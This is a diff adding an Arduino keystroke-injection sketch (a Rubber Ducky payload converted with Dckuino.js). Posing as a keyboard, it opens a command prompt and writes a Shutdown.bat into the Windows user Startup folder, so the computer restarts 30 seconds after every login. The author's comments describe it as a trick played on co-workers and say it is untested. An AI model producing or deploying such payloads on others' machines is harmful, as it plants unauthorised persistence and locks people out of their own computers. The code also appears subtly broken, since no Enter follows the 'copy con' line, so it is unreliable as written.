@@ -1,0 +1,73 @@
+/*
+ * Generated with <3 by Dckuino.js, an open source project !
+ */
+
+#include "Keyboard.h"
+
+void typeKey(int key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+
+  // /////////////////////////////////////////////////////////////////////////////////////////////////////////
+  // ///       I don't have a ducky (yet) but this is a trick I used to pull on co-workers.               ///
+  // ///       Because I don't have a ducky I'm guessing at the delays based on other scripts.            ///
+  // ////////////////////////////////////////////////////////////////////////////////////////////////////////
+  // Open the command line. You don't need admin because you are only adding to the Users Startup Directory
+  typeKey(KEY_LEFT_ESC);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_LEFT_ESC);
+  Keyboard.releaseAll();
+
+  delay(400);
+
+  Keyboard.print("cmd");
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+
+  // start making Shutdown.bat
+  Keyboard.print("copy con \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Shutdown.bat\"");
+
+  Keyboard.print("@echo off");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("shutdown /r /t 30");
+
+  // The shutdown command has many good options '/t' adds a Delay, and '/r' restarts
+  // '/s' will shut the computer down and '/l' (L) is to just logoff the user more options are available by running 'shutdown /?'
+  typeKey(KEY_RETURN);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press('z');
+  Keyboard.releaseAll();
+
+  Keyboard.print("exit");
+
+  typeKey(KEY_RETURN);
+
+  // /////////////////////////////////////////////////////////////////////////////////////////////////////////
+  // ///    I think I did everything right in this, but i don't have a Ducky to test it with. Let me know  ///
+  // ///    what you think or if I made a mistake.                    ///
+  // /////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+  // Ending stream
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
